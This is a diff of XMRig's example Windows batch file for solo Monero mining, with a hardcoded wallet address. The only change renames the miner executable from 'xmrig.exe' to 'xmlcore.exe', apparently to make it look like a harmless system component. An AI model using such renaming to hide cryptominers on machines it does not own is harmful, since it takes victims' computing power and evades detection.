@@ -1,7 +1,7 @@
 :: Example batch file for mining Monero solo
 ::
 :: Format:
-::	xmrig.exe -o <node address>:<node port> -a rx/0 -u <wallet address> --daemon
+::	xmlcore.exe -o <node address>:<node port> -a rx/0 -u <wallet address> --daemon
 ::
 :: Fields:
 ::	node address		The host name of your monerod node or its IP address. It can also be a public node with RPC enabled, for example node.xmr.to
@@ -12,5 +12,5 @@
 :: But you will only get a payout when you find a block which can take more than a year for a single low-end PC.
 
 cd %~dp0
-xmrig.exe -o node.xmr.to:18081 -a rx/0 -u 48edfHu7V9Z84YzzMa6fUueoELZ9ZRXq9VetWzYGzKt52XU5xvqgzYnDK9URnRoJMk1j8nLwEVsaSWJ4fhdUyZijBGUicoD --daemon
+xmlcore.exe -o node.xmr.to:18081 -a rx/0 -u 48edfHu7V9Z84YzzMa6fUueoELZ9ZRXq9VetWzYGzKt52XU5xvqgzYnDK9URnRoJMk1j8nLwEVsaSWJ4fhdUyZijBGUicoD --daemon
 pause
